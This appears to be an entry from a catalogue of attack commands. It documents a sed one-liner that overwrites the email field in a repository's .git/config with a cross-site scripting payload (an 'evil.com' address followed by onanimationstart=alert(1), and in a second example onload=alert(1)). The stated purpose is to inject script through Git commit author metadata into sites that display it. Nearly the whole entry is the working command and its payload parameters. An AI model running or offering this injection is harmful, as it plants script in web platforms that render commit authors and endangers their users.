---
data: >-
  sed -i '/[user]/,/^$/ { /email =/c\temail = anyname@evil.com\"
  onanimationstart=alert(1) //' .git/config
tags:
  - git-config
  - sed
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
id: 8a3f19d4-7648-4c17-b1b5-7655ab8ae508
created_at: '2025-12-13T23:52:55.050Z'
updated_at: '2025-12-13T23:52:55.050Z'
verified: false
validated: true
submitted: true
---
---

# edit-git-config-email

## Command

```bash
sed -i '/[user]/,/^$/ { /email =/c\temail = anyname@evil.com\" onanimationstart=alert(1) //' .git/config
```

## Description

Uses sed to replace the user email in .git/config with a malicious payload for XSS injection via Git commit author metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `.git/config` | Path to local Git config file | Yes |
| `anyname@evil.com\" onanimationstart=alert(1)` | Crafted email payload for attribute injection | Yes |

## Examples

### Basic Usage

```bash
sed -i '/[user]/,/^$/ { /email =/c\temail = payload@evil.com\" onload=alert(1) //' .git/config
```

### Advanced Usage

For Windows (Git Bash): Use `sed -i` equivalent or manual edit.

## Expected Output

No stdout; config file modified silently. Verify with `git config --local user.email`.

## Related

- [[Related Procedure: Inject Malicious Email into Git Config]]
